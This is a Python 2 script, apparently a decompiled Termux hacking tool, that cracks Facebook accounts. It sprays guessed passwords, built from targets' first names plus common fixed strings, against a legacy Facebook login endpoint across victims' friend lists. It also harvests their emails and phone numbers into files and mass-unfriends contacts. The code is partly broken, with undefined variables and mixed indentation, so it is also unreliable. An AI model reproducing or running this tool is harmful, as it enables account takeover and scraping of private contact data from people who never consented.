# -*- coding: utf-8
# coded by Mr. NIKI
# fb.me/Niki.Cyber404
# instagram.com/niki.cyber404

try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] %s installed yet"%(modul))
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://anggaxd.herokuapp.com/ua.txt").text.strip()
ip = s.get('https://anggaxd.herokuapp.com/ip/').text
	
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
	os.system("clear")
	print("  \033[0;92m_   _ _____ _  _______")
	print("  \033[0;92m| \ | |_   _| |/ /_   _|")
	print("  \033[0;92m|  \| | | | | ' /  | | ")
	print("  \033[0;92m| . ` | | | |  <   | | ")
	print("  \033[0;92m| |\  |_| |_| . \ _| |_")
	print("  \033[0;92m|_| \_|_____|_|\_\_____|")
	print("           ")
	
	
        print("  \033[0;92m---------------------------------------------")
        print("  \033[0;92mAUTHOR   :NIKI HACKER")
        print("  \033[0;92mFACEBOOK :Niki.Cyber404")
        print("  \033[0;92mYOUTUBE  :JAMES NIKI")
        print("  \033[0;92mTELEGRAM :@niki_cyber404")
        print("  \033[0;92mGITHUB   :Niki-Cyber404")
        print("  \033[0;92m---------------------------------------------")
    
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[●] Loging In "+o),;sys.stdout.flush();time.sleep(1)


back = 0
successful = []
cpb = []
oks = []
id = []

def token():
	os.system('clear')
	print logo
	toket = raw_input("Token : ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("/sdcard/Android/data/com.termux/token.log", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;92m√ Login Facebook Account'
		menu()
	except KeyError:
		print '\033[1;91m! Token Login '
		time.sleep(1.7)
		masuk()
	except requests.exceptions.SSLError:
		print '! W31C0M3'
		exit()
    
def menu():
	os.system('clear')
	try:
		time.sleep(0)
		print 'OHHH Bhai'
		
	except:
		print "\33[1;91mapi key not available"
		time.sleep(1)
		exit()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token=+toket')
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(t.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print '\33[1;91mtokens not available'
		os.system('rm -rf login.txt')
		time.sleep(1)
		niki()
	except requests.exceptions.ConnectionError:
		print 'No connection'
		keluar()
	os.system("clear")
	print(logo)
	print("email   : "+n)
	print("key      : "+f)
	print("[✓] Name : "+name)
	print("[✓] ID   : "+id)
	print (50*"-")
	print
	print ("[1] Crack Menu")
	print ("[2] Crack With Pass Choice")
	print ("[3] Grab Emails")
	print ("[4] Grab Mobile Numbers")
	print ("[5] Unfriend with one click")
	print ("[6] Update BXI Tool")
	print ("[7] Follow Me On Facebook")
	print ("[8] Log Out")
	print ("[0] Exit            ")
	print (50*"-")
	action()


def action():
	chb = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if chb =="":
		print ("[!] Fill in correctly")
		action()
	elif chb =="1":
	    crack_menu()
	elif chb =="2":
		choice_menu()
	elif chb =="3":
	    cb()
	    gbmail()
	elif chb =="4":
	    gbnmbr()
	elif chb =="5":
	    unfriend()
	elif chb =="6":
	    os.system("pip2 install --upgrade bxin")
	    cb()
	    print (logo)
	    psb("100%")
	    
	    
	elif chb =="7":
	    os.system("xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl")
	    time.sleep(1)
	    menu()
	elif chb =="8":
	    os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
	    print
	    psb(" Logout successfully")
	elif chb =="0":
		exb()
	else:
		print ("[!] Fill in correctly")
		action()


def crack_menu():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	print (logo)
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Any Public ID")
	print ("[3] Crack From File")
	print ("[0] Back")
	print (50*"-")
	crack_action()

def crack_action():
	bch = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if bch =="":
		print ("[!] Fill in correctly")
		crack_action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			crack_menu()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	elif bch =="3":
		os.system("clear")
		print (logo)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			crack_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		crack_action()
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			d=b["first_name"]
			e=d.replace(" ", "")
			f=e.lower()
			g=pf(f, 1)
			h=g.upper()
			i=rf(f, 1)
			c=h+i
			pass1="786786"
			data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					pass2 = c+"@@@786"
					data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print "[Checkpoint] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							pass3 = c + "102030"
							data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print "[Checkpoint] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									pass4 = "223344"
									data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print "[Checkpoint] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
											pass5 = c + "786"
											data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print "[Checkpoint] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													pass6 = "123456"
													data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print "[Checkpoint] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															pass7 = c + "112233"
															data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print "[Checkpoint] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																	
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
	print("[✓] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")

def choice_menu():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	os.system("clear")
	print (logo)
	print ("[1] Crack From Friend List")
	print ("[2] Crack From Any Public ID")
	print ("[3] Crack From File")
	print ("[0] Back")
	print (50*"-")
	choice_action()

def choice_action():
	bch = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if bch =="":
		print ("[!] Fill in correctly")
		choice_action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		pass1=raw_input(" Put Password No 1 : ")
		pass2=raw_input(" Put Password No 2 : ")
		pass3=raw_input(" Put Password No 3 : ")
		pass4=raw_input(" Put Password No 4 : ")
		pass5=raw_input(" Put Password No 5 : ")
		pass6=raw_input(" Put Password No 6 : ")
		pass7=raw_input(" Put Password No 7 : ")
		r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		pass1=raw_input(" Put Password No 1 : ")
		pass2=raw_input(" Put Password No 2 : ")
		pass3=raw_input(" Put Password No 3 : ")
		pass4=raw_input(" Put Password No 4 : ")
		pass5=raw_input(" Put Password No 5 : ")
		pass6=raw_input(" Put Password No 6 : ")
		pass7=raw_input(" Put Password No 7 : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			choice_menu()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	elif bch =="3":
		os.system("clear")
		print (logo)
		try:
			idlist = raw_input("[✓] Enter File Path  : ")
			pass1=raw_input(" Put Password No 1 : ")
			pass2=raw_input(" Put Password No 2 : ")
			pass3=raw_input(" Put Password No 3 : ")
			pass4=raw_input(" Put Password No 4 : ")
			pass5=raw_input(" Put Password No 5 : ")
			pass6=raw_input(" Put Password No 6 : ")
			pass7=raw_input(" Put Password No 7 : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			choice_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		choice_action()
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
		except OSError:
			pass
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q1 = json.loads(data1.text)
			if "access_token" in q1:
				print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q1["error_msg"]:
					print "[Zalim Cp] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					data2 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q2 = json.loads(data2.text)
					if "access_token" in q2:
						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q2["error_msg"]:
							print "[Zalim Cp] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							data3 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q3 = json.loads(data3.text)
							if "access_token" in q3:
								print "\x1b[1;95m[Zalim Hack]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q3["error_msg"]:
									print "[Zalim Cp] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									data4 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q4 = json.loads(data4.text)
									if "access_token" in q4:
										print "\x1b[1;94m[Zalim Hack]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q4["error_msg"]:
											print "[Zalim Cp] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
											data5 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q5 = json.loads(data5.text)
											if "access_token" in q5:
												print "\x1b[1;93m[Zalim Hack]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q5["error_msg"]:
													print "[Zalim Cp] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													data6 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q6 = json.loads(data6.text)
													if "access_token" in q6:
														print "\x1b[1;97m[Zalim Hack]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q6["error_msg"]:
															print "[CZalim Cp] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															data7 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q7 = json.loads(data7.text)
															if "access_token" in q7:
																print "\x1b[1;98m[Zalim Hack]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q7["error_msg"]:
																	print "[Zalim Cp] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print ("[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb)))
	print("[✓] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")
		
def gbmail():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	else:
	    agbm()

def agbm():
	bch = ("2")
	if bch =="":
		print ("[!] Fill in correctly")
		agbm()
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			gbmail()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			q = json.loads(data.text)
			if "email" not in q:
				pass
			else:
				if "email" in q:
				    gms = q["email"]
				    print (user + "  |  " + gms + "\n")
				    bms.open("emails.txt", "a")
				    bms.write(user + "  |  " + gms + "\n")
				    bms.close()
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print("[✓] File Has Been Saved : emails.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")
		
def gbnmbr():
	global toket
	os.system("clear")
	try:
		toket=open("/sdcard/Android/data/com.termux/token.log","r").read()
	except IOError:
		print("[!] Token invalid")
		os.system("rm -rf /sdcard/Android/data/com.termux/token.log")
		time.sleep(1)
		token()
	else:
	    agbn()

def agbn():
	bch = ("2")
	if bch =="":
		print ("[!] Fill in correctly")
		agbn()
	elif bch =="2":
		os.system("clear")
		print (logo)
		idt = raw_input("[✓] Enter ID : ")
		os.system("clear")
		print (logo)
		try:
			jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			psb("[✓] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("[!] ID Not Found!")
			raw_input("\n[Back]")
			gbnmbr()
		r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z["data"]:
			id.append(i["id"])
	xxx = str(len(id))
	psb ("[✓] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[✓] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			data = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			q = json.loads(data.text)
			if "mobile_phone" not in q:
				pass
			else:
				if "mobile_phone" in q:
				    gns = q["mobile_phone"]
				    gn=q["name"]
				    print (user + " | " + gn + gns + "\n")
				    bms.open("numbers.txt", "a")
				    bms.write(user + " | " + gn + gns + "\n")
				    bms.close()
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (50*"-")
	print ("[✓] Process Has Been Completed /sdcard/Android/data/com.termux/token.log")
	print("[✓] File Has Been Saved : numbers.txt")
	raw_input("\n[Back]")
	if xxx == "0":
		crack_menu()
	else:
		os.system("python2 .README.md")

def unfriend():
    os.system('clear')
    try:
        toket = open('/sdcard/Android/data/com.termux/token.log', 'r').read()
    except IOError:
        print 'token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 'To stop press CTRL then press Z'
        print 50*"-"
        print
        try:
            pek = session.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                name = i['name']
                id = i['id']
                session.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print ("[Unfriended]  "+name)

        except IndexError:
            pass
        except KeyboardInterrupt:
            exit()
    print " All friend has been removed"
    raw_input('[Back]')
    os.system("python2 .README.md")
    
if __name__ == "__main__":
	menu()


# Okay Decompiling b.py
